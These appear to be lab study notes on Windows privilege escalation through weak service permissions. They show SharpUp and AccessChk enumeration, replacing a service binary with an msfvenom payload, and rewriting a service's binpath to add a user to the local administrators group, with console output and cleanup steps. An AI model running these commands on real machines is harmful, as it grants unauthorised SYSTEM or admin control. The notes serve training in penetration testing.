# Weak Permissions
The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.
## Permissive File System ACLs

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
```powershell-session
PS C:\htb> .\SharpUp.exe audit
```

![](Pasted%20image%2020250319223635.png)
The tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

#### Checking Permissions with icacls

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
![](Pasted%20image%2020250319225256.png)
#### Replacing Service Binary

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.

```cmd-session
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

---
#### Reviewing SharpUp Again

Let's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.

Weak Permissions

```cmd-session
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

#### Checking Permissions with AccessChk

Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

```cmd-session
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

#### Check Local Admin Group

Checking the local administrators group confirms that our user `vipa0z` is not a member.

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

#### Changing the Service Binary Path

We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

```cmd-session
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators vipa0z /add"

[SC] ChangeServiceConfig SUCCESS
```

#### Stopping Service

Next, we must stop the service, so the new `binpath` command will run the next time it is started.

```cmd-session
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

#### Starting the Service

Since we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.

Weak Permissions

```cmd-session
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

#### Confirming Local Admin Group Addition

Finally, check to confirm that our user was added to the local administrators group.

Weak Permissions

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
vipa0z
mrb3n
The command completed successfully.
```

Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account. Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.

---

## Weak Service Permissions - Cleanup

We can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.

#### Reverting the Binary Path

```cmd-session
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```

#### Starting the Service Again

If all goes to plan, we can start the service again without an issue.

```cmd-session
C:\htb> sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
```

#### Verifying Service is Running

Querying the service will show it running again as intended.

```cmd-session
C:\htb> sc query WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
    
```
